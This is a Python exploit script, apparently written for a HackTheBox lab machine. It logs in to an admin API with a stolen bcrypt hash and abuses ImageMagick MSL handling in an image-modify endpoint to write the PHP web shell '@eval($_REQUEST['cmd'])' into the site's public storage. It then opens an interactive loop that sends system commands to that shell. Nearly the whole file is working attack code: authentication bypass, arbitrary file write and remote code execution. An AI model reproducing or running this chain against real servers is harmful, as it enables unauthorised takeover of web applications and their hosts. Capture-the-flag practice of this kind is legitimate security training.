#!/usr/bin/env python3

import requests

# Define the local URL and target URL, admin email and hash
target_url = "http://10.x.x.x"
admin_email = "admin_users_email@boxname.htb" 
admin_hash = "fullbcrypthashincludingssalt"

# MSL code to write a file. webshell is contained in the caption. 
# Use "caption:" and "info:" tags
msl_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php @eval(@$_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/shell.php" />
</image>'''

# Start a session, to hold all authentication tokens and X-XSRF headers
s = requests.session()

def pass_the_hash():
    # Log in using the v2 API
    url = target_url + "/api/v2/auth/login"
    json = {"email": admin_email, "hash": admin_hash}
    s.post(url, json=json)

def write_webshell():
    # POST the msl with json moved to the request params. 
    url = target_url + "/api/v2/admin/image/modify"
    url += "?path=vid:msl:/tmp/php*&effect=sepia"
    files = {"payload":("payload.msl", msl_file, 'text/plain')}
    response = s.post(url, files=files)
    print(f'[{response.status_code}] {response.text}')
    
def interact_webshell():
    while True:
        try:
            cmd = input("> ")
            payload_url = target_url + "/storage/shell.php"
            uri = f'{payload_url}?cmd={cmd}'
            # Send command to webshell. No need to use the same session.
            response = requests.get(f'{payload_url}?cmd=system("{cmd}");')
            try:
                output = response.text.split('caption:')[1].split(' CAPTION')[0]
            except:
                output = f'Bad response: [{response.status_code}]\n{response.text}'
            print(output)
        except KeyboardInterrupt:  # If the user presses Ctrl+C, exit the program
            exit(0)

pass_the_hash()
write_webshell()
interact_webshell()
